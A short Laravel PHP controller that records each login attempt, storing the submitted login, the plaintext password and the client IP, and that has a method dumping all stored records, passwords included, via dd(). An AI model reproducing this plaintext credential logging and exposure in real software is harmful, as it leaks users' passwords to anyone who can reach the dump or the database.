<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests\ErrorRequest;
use App\Models\autorization;
use App\Http\Controllers\DB;
class autorizationController extends Controller
{
    public function submit(ErrorRequest $auth){

         $autorization = new autorization();
 $autorization->error = 'Успешная авторизация';
 $autorization->login = $auth->input('login');
 $autorization->password = $auth->input('password');
 $autorization->ip = \Request::ip();
 

 $autorization->save();

}
public function logsAuth(){
    $logsAuth = new autorization;
    dd($logsAuth->all());
        }
}